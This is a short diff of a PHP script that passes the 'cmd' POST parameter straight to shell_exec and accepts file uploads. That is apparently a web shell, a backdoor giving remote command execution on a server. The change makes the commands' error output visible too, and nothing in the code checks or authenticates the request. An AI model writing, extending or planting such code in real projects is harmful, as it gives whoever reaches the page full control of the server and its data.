@@ -8,7 +8,7 @@ $cwd = getcwd();
 
 if (isset($_POST['cmd']))
 {
-	$stdout = shell_exec($_POST['cmd']);
+	$stdout = shell_exec($_POST['cmd'].' 2>&1');
 }
 
 if (isset($_FILES['file']) && $_FILES['file']['error'] == 0)
